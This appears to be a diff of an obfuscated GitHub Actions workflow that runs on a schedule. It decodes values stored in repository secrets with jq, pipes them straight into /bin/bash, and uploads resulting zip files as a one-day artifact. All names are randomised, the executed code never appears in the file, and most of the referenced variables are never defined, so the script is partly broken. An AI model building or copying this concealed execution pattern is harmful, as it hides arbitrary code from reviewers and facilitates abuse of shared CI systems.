@@ -1,26 +1,28 @@
 name: dongyihongli
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '6 2/6 * * *'
 
-jobs:  # 15860
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dongyihongli
         env:
-          rrawu1: ${{ secrets.rrawu1 }}
+          wrno156: ${{ secrets.wrno156 }}
         run: |
-          echo $rrawu1 | jq -r .hatze167 | /bin/bash
-          echo $y28073 | jq -r .quofp00 | /bin/bash
-          echo $lpgp6919 | jq -r .t2394 | /bin/bash
-          echo $gpijz7 | jq -r .sj04580 | /bin/bash
-          echo $cgzvi24 | jq -r .qa886 | /bin/bash
-          echo $duy51 | jq -r .lgld3 | /bin/bash
-          echo $vu5 | jq -r .b054 | /bin/bash
-          echo $tal07 | jq -r .p2 | /bin/bash
-          echo $kbkh60237 | jq -r .cfdsw30704 | /bin/bash
-          echo $tk55 | jq -r .bi28304 | /bin/bash
+          printf '%s' "$wrno156" | jq -r .etntb502 | /bin/bash
+          printf '%s' "$ffl3718" | jq -r .ximb6 | /bin/bash
+          printf '%s' "$yqm94" | jq -r .hmzgo0575 | /bin/bash
+          printf '%s' "$ziuj02237" | jq -r .w67296 | /bin/bash
+          echo $yf60 | jq -r .iez9 | /bin/bash
+          printf '%s' "$xjpia40" | jq -r .n248 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wiUQAPll
+          path: "*.zip"
+          retention-days: 1
